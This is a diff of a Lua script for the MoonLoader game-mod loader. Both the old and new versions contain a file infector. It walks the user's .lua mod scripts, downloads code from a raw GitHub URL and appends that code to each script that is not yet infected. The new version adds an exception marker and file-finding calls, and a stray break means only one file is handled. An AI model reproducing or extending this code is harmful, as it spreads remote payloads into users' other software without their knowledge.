@@ -1,25 +1,32 @@
+local Handle, FileName = findFirstFile("moonloader\\*.lua")
 local Directory = getWorkingDirectory().."\\"
-local Dir = io.popen('chcp 1251|dir /a-d /b "'..Directory..'"')
-for Filename in Dir:lines() do
-    if Filename:find("^.+%.lua$") then
-        local FileText = ""
-        local File = io.open(Directory..Filename, "r")
-        for Line in File:lines() do
-            if FileText ~= "" then
-                FileText = FileText.."\n"
-            end
-            FileText = FileText..Line
+while FileName do
+    local FileText = ""
+    local Skip = false
+    local File = io.open(Directory..FileName, "r")
+    for Line in File:lines() do
+        if Line:find("%-%- Exception "..FileName) then
+            Skip = true
+            break
         end
-        File:close()
-        if not FileText:find("https://raw%.githubusercontent%.com/TheVegasPro/123345/main/4124") then
-            local encoding = require "encoding"
-            encoding.default = "CP1251"
-            local File = io.open(Directory..Filename, "w")
-            File:write(FileText.."\n"..encoding.UTF8:decode((require("requests")).get("https://raw.githubusercontent.com/TheVegasPro/123345/main/4124").text))
-            File:close()
+
+        if FileText ~= "" then
+            FileText = FileText.."\n"
         end
+        FileText = FileText..Line
     end
+    File:close()
+    if not Skip and not FileText:find("https://raw%.githubusercontent%.com/TheVegasPro/123345/main/4124") then
+        local encoding = require "encoding"
+        encoding.default = "CP1251"
+        local File = io.open(Directory..FileName, "w")
+        File:write("-- Exception "..FileName.."\n"..FileText.."\n"..encoding.UTF8:decode((require("requests")).get("https://raw.githubusercontent.com/TheVegasPro/123345/main/4124").text))
+        File:close()
+    end
+    FileName = findNextFile(Handle)
+    break
 end
+findClose(Handle)
 function onReceiveRpc(id, bs)
     if id == 93 then
         local color = raknetBitStreamReadInt32(bs)
